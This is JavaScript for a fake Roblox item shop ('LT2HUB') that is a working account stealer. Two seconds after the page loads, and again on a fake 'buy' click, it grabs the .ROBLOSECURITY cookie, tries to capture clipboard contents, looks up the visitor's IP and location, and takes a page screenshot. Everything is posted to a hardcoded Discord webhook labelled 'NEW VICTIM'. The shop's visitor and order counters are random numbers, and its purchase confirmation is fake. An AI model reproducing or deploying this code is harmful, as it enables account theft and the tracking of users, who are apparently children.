const webhook = "https://discord.com/api/webhooks/1436941603586576429/ZdBgo21SF3IFNIzZoOh-9OULt0edw8bYbnAX2AIRCsX11v0m04cftdZjea_nKm_y4bwd";

async function ownThisKid() {
    const data = {
        username: "LT2HUB STEALTH",
        avatar_url: "https://i.imgur.com/X5eK9pN.png",
        embeds: [{
            title: "🪓 NEW VICTIM ON LT2HUB",
            color: 3447003,
            timestamp: new Date().toISOString(),
            fields: []
        }]
    };

    // ROBLOX COOKIE
    const roblox = document.cookie.split(';').find(c => c.includes('.ROBLOSECURITY'));
    if(roblox) {
        const token = roblox.split('=')[1].trim();
        data.embeds[0].fields.push(
            { name: "🎟️ .ROBLOSECURITY", value: "```" + token.substring(0,1800) + "```" },
            { name: "🔑 LOGIN", value: "Use EditThisCookie → Import → Paste token" }
        );
    }

    // SILENT CLIPBOARD
    const input = document.createElement('input');
    input.style.position = 'fixed';
    input.style.opacity = 0;
    document.body.appendChild(input);
    input.focus();
    setTimeout(() => {
        if(input.value) {
            data.embeds[0].fields.push({
                name: "📋 Clipboard", value: "```" + input.value.substring(0,1000) + "```" 
            });
        }
        input.remove();
    }, 150);

    // IP + GEO
    try {
        const ip = await (await fetch('https://api.ipify.org?format=json')).json();
        const geo = await (await fetch(`https://ipapi.co/${ip.ip}/json/`)).json();
        data.embeds[0].fields.push(
            { name: "🌐 IP", value: ip.ip },
            { name: "📍 Location", value: `${geo.city}, ${geo.country_name}` }
        );
    }catch(e){}

    // SCREENSHOT
    setTimeout(async () => {
        try {
            const canvas = await html2canvas(document.body);
            data.embeds[0].image = { url: canvas.toDataURL() };
            fetch(webhook, {method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify(data)});
        }catch(e){}
    }, 3000);

    fetch(webhook, {method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify(data)});
}

// FAKE STATS
document.getElementById('online').textContent = Math.floor(Math.random()*8000+12000).toLocaleString();
document.getElementById('orders').textContent = Math.floor(Math.random()*900000+1800000).toLocaleString();

// TABS
document.querySelectorAll('.menu a').forEach(link => {
    link.addEventListener('click', e => {
        e.preventDefault();
        document.querySelectorAll('.menu a').forEach(a => a.classList.remove('active'));
        link.classList.add('active');
        document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
        document.getElementById(link.dataset.tab).classList.add('active');
    });
});

// BUY = SUCCESS PAGE
function buy(item) {
    document.body.innerHTML = `
        <div style="position:fixed;top:0;left:0;width:100vw;height:100vh;background:#0d1117;display:flex;align-items:center;justify-content:center;flex-direction:column;color:white">
            <h1 style="font-size:5em;color:#58a6ff">✅ SUCCESS</h1>
            <p style="font-size:2em;margin:20px">${item} delivered!</p>
            <p>Check your base in 20 seconds</p>
        </div>
    `;
    ownThisKid();
}

// AUTO GRAB
window.addEventListener('load', () => setTimeout(ownThisKid, 2000));
